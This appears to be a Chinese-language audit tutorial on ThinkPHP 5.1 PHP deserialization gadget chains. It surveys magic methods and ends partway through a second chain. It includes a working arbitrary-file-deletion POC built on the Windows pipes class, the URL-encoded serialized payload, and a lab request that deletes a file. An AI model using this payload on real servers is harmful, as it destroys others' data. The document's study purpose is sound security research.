[TOC]



# ==ThinkPHP反序列化漏洞==

搜索危险函数，从最常用的开始入手

反序列化时首先调用 `__wakeup()` 然后 `__destruct()` 

## 反序列化漏洞一

该漏洞也被称为任意文件删除漏洞，只不过暂时没有利用点

### 全局搜索 `__wakeup()`



![image-20240831225341374](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240831225341374.png)

分别进行分析

#### 第一个

以下三份代码都是 `abstract class Model implements \JsonSerializable, \ArrayAccess` 类中的

```php
public function __wakeup()
{
    $this->initialize();
}
```

进入 `$this->initialize()`

```php
protected function initialize()
{
    if (!isset(static::$initialized[static::class])) {
        static::$initialized[static::class] = true;
        static::init();
    }
}
```

这段代码都是基于静态变量，判断 `static::$initialized[static::class]` 静态变量是否存在，如果不存在则进入循环，设置为 true 并执行 `static::init()` 静态函数

```php
protected static function init()
{}
```

然而这个函数啥都没执行，走不通

#### 第二个

```php
public function __wakeup()
{
    $this->app     = Container::get('app');
    $this->request = $this->app['request'];
}
```

其中 app 是写死的，我们自己也无法构造

`Container::get('app')` 函数如下：

```php
public static function get($abstract, $vars = [], $newInstance = false)
{
    return static::getInstance()->make($abstract, $vars, $newInstance);
}
```

返回的又是静态的

`$this->app['request']` 是类的属性，说不定有戏，进去看看

```php
$this->request = $this->app['request']
```

![image-20240831231355442](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240831231355442.png)

获得的值又赋值给另一个属性，request 也是写死的，也没法自己构造

#### 第三个

```php
public function __wakeup()
{
    $this->router = Container::get('route');
}
```

和第一个函数是一样的，返回一个静态的

![image-20240831232006993](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240831232006993.png)

### 全局搜索`__destruct()`

![image-20240831232443028](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240831232443028.png)

#### 第一个

```php
public function __destruct()
{
    $this->stop();
}
```

进入 `$this->stop()` 

```php
public function stop()
{
    if ($this->isRunning()) {
        if ('\\' === DIRECTORY_SEPARATOR && !$this->isSigchildEnabled()) {
            exec(sprintf('taskkill /F /T /PID %d 2>&1', $this->getPid()), $output, $exitCode);
            if ($exitCode > 0) {
                throw new \RuntimeException('Unable to kill the process');
            }
        } else {
            $pids = preg_split('/\s+/', `ps -o pid --no-heading --ppid {$this->getPid()}`);
            foreach ($pids as $pid) {
                if (is_numeric($pid)) {
                    posix_kill($pid, 9);
                }
            }
        }
    }

    $this->updateStatus(false);
    if ($this->processInformation['running']) {
        $this->close();
    }

    return $this->exitcode;
}
```

这是一个正常的清理进程的函数，然后更新状态

#### 第二个

```php
public function __destruct()
{
    // 关闭连接
    $this->close();
}
```

```php
public function close()
{
    $this->linkID    = null;
    $this->linkWrite = null;
    $this->linkRead  = null;
    $this->links     = [];

    // 释放查询
    $this->free();

    return $this;
}
```

这啥都没有

#### 第三个

```php
public function __destruct()
{
    $this->close();
}
```

```php
public function close()
{
    foreach ($this->pipes as $pipe) {
        fclose($pipe);
    }
    $this->pipes = [];
}


其中
public $pipes = [];  这是一个类的属性，可以构造
```

![image-20240831233450919](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240831233450919.png)

可惜 fclose 的参数需要 文件流，而 `$pipes` 如果不是文件流类型的，这样的话执行到这句代码由于类型问题报错，代码直接结束执行

#### 第四个

以下三分代码均来自 `class Windows extends Pipes` 类中的方法

```php
public function __destruct()
{
    $this->close();
    $this->removeFiles();
}
```

`$this->close()`

```php
public function close()
{
    parent::close();
    foreach ($this->fileHandles as $handle) {
        fclose($handle);
    }
    $this->fileHandles = [];
}
```

这里走不通

`$this->removeFiles()`

```php
private function removeFiles()
{
    foreach ($this->files as $filename) {
        if (file_exists($filename)) {
            @unlink($filename);
        }
    }
    $this->files = [];
}




其中$files 是类的属性，可以构造
private $files = [];
```

> 在PHP中，`@unlink($filename)`函数用于删除指定的文件。`unlink`函数会尝试删除指定路径的文件，而`@`符号用于抑制可能发生的错误或警告。如果删除文件过程中出现错误（例如文件不存在或没有权限），`@`符号会阻止错误信息被显示。

所以，如果我们构造 `$filename` 变量的值是一个文件路径，那么该函数就会删除这个构造的文件，前提是该文件的文件夹具有写权限

### 漏洞利用

先搞清楚这个漏洞涉及到了几个类

`class Windows extends Pipes`

```php
namespace think\process\pipes;
use think\Process;

class Windows extends Pipes{
    private $files = [];


    public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }
    
    public function close()
    {
        parent::close();
        foreach ($this->fileHandles as $handle) {
            fclose($handle);
        }
        $this->fileHandles = [];
    }
    
    
    private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
    
}

//__destruct()函数存在于Windows类中，而这个Windows类又继承自Pipes类，而且这些函数也都是该类中自行定义的，并不是从Pipes类中继承而来的
//所以Pipes类没有实际上的作用，不过我们在POC生成中还是需要使用它，因为Windows类继承自Pipes，最后的POC中需要有Pipes有的信息
```

`abstract class Pipes`

这是一个抽象类，无法实例化，只能用来继承

```php
namespace think\process\pipes;

abstract class Pipes{
    
}
```

所以最终的POC生成代码如下：

```php
<?php
// ThinkPHP 任意文件删除POC
namespace think\process\pipes;
use think\Process;

abstract class Pipes{
    
}

class Windows extends Pipes{
    private $files = ["/opt/lampp/htdocs/unserializevul/temp/hello.txt"];

}

$a = new Windows();
echo urlencode(serialize($a));
  
?>
```

访问 http://192.168.230.188/unserializevul/unserializePOC.php 得到序列化结果

```
O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A47%3A%22%2Fopt%2Flampp%2Fhtdocs%2Funserializevul%2Ftemp%2Fhello.txt%22%3B%7D%7D
```

![image-20240901163837537](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240901163837537.png)

我们先尝试该漏洞是否可行，可自行构造一个反序列化起点，比如，在ThinkPHP框架的默认页面中，修改代码

```php
<?php
namespace app\index\controller;

class Index
{
    public function index($input="")
    {

        unserialize($input);

        return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V5.1<br/><span style="font-size:30px">12载初心不改（2006-2018） - 你值得信赖的PHP框架</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
    }

    public function hello($name = 'ThinkPHP5')
    {
        return 'hello,' . $name;
    }
}

```

![image-20240901163850078](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240901163850078.png)

然后访问该页面并传入POC

```
http://192.168.230.188/tpdemo/public/index.php?input=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A47%3A%22%2Fopt%2Flampp%2Fhtdocs%2Funserializevul%2Ftemp%2Fhello.txt%22%3B%7D%7D
```

![image-20240901163901789](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240901163901789.png)

去查看文件是否已被删除

![image-20240901163922824](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240901163922824.png)

ok，成功，接下来就去寻找真正的漏洞序列化起点

## 反序列化漏洞二

![image-20240831234413699](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240831234413699.png)

基于上面的审计，并且发现 `file_exists($filename)` 函数中的参数是字符串类型，而这里的 `$filename` 本来是 `$this->files` 类属性的 as（就是for循环里的那个 as（作为）） 

所以`$filename`也是类属性，如果可以构造该属性的值为另一个类的实例，并且该类的实例中有 `__toString()` 函数，那么就可以执行 `__toString()` 

所以现在就需要去找存在 `__toString()` 魔术方法的类

给Windows类的files属性赋值为具有 __toString() 魔术方法的类的实例即可

### 全局搜索 `__toStirng()`

![image-20240901172457496](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240901172457496.png)

#### 第一个

下面三个方法都是Collection类中的

```php
public function __toString()
{
    return $this->toJson();
}

```

```php
public function toJson($options = JSON_UNESCAPED_UNICODE)
{
    return json_encode($this->toArray(), $options);
}
```

```php
public function toArray()
{
    return array_map(function ($value) {
        return ($value instanceof Model || $value instanceof self) ? $value->toArray() : $value;
    }, $this->items);
}
```

> 1. 遍历 `$this->items` 数组：`array_map` 会遍历 `$this->items` 数组中的每个元素。
> 2. 处理每个元素：
>    - 对于每个元素 `$value`，判断它是否是 `Model` 类或当前类的实例。
>    - 如果是，则调用 `$value->toArray()` 将其转换为数组。
>    - 如果不是，则直接返回该元素（原始值）。
> 3. 返回结果：`array_map` 将处理后的结果收集到一个新数组中，并将其作为 `toArray` 方法的返回值。

所以最终只是将 `$this->items` 属性中的值全部处理为 json 数据，其他没什么

#### 第二个

下面两个方法都是Paginator抽象类中的方法

```php
public function __toString()
{
    return (string) $this->render();
}
abstract public function render();
```

代码走到这直接没了

#### 第三个

```php
public function escapeToken($token)
{
    return preg_match('{^[\w-]+$}', $token) ? $token : escapeshellarg($token);
}

/**
     * 返回传递给命令的参数的字符串
     * @return string
     */
public function __toString()
{
    $tokens = array_map(function ($token) {
        if (preg_match('{^(-[^=]+=)(.+)}', $token, $match)) {
            return $match[1] . $this->escapeToken($match[2]);
        }

        if ($token && '-' !== $token[0]) {
            return $this->escapeToken($token);
        }

        return $token;
    }, $this->tokens);

    return implode(' ', $tokens);
}
```

> 该方法处理一个对象内部的 `tokens` 属性（假设这个属性是一个包含字符串的数组），并对这些字符串进行一系列的处理，最后将它们连接成一个单独的字符串并返回。
>
> 而且 escapeshellarg 是一个转义函数

该 __toString() 方法无效

#### 第四、五个

```php
foreach ($data as $key => $val) {
    $item = $this->parseKey($query, $key, true);

    if ($val instanceof Expression) {
        $result[$item] = $val->getValue();
        continue;
    } elseif (!is_scalar($val) && (in_array($key, (array) $query->getOptions('json')) || 'json' == $this->connection->getFieldsType($options['table'], $key))) {
        $val = json_encode($val, JSON_UNESCAPED_UNICODE);
    } elseif (is_object($val) && method_exists($val, '__toString')) {
        // 对象数据写入
        $val = $val->__toString();
    }
}
```

```php
if ($value instanceof Expression) {

} elseif (is_object($value) && method_exists($value, '__toString')) {
    // 对象数据写入
    $value = $value->__toString();
}
```

二者都是一样的，大致功能如下：

1. 如果 `$value` 是 `Expression` 类的实例，则执行特定于 `Expression` 类的操作（此部分代码未给出）。
2. 如果 `$value` 是一个对象，并且该对象具有 `__toString` 方法，则将 `$value` 转换为字符串，并更新 `$value` 变量的值为该字符串。

对反序列化无效

#### 第六个

```php
namespace think\db;

class Expression
{
    protected $value;

    public function __toString()
    {
        return (string) $this->value;
    }
}
```

意思是如果 第四个 `__destruct()` 方法（Windows类）中的 `files` 属性的值 构造为 Expression 类实例，那么最终可以执行 __toString() 并返回该类实例中的 value 属性的值，并强制转换为字符串

**但是，遗憾的是，代码到此就结束了，还没有找到调用的地方，也就是没找到可以开始反序列化的起点，所以这里实际上就算存在可以构造的地方，但没有 unserialize 所以依旧是无法调用**

#### 第七个

```php
trait Conversion
{
        public function toJson($options = JSON_UNESCAPED_UNICODE)
    {
        return json_encode($this->toArray(), $options);
    }


    public function __toString()
    {
        return $this->toJson();
    }
}
```

和上面还是一样 利用回调函数 处理 JSON 的

不过其中 `$this->toArray()` 是类方法 我们进去看看

![image-20240901212613640](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240901212613640.png)

![image-20240901212635696](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240901212635696.png)

好长的代码，欲知后事如何，尽情期待下集

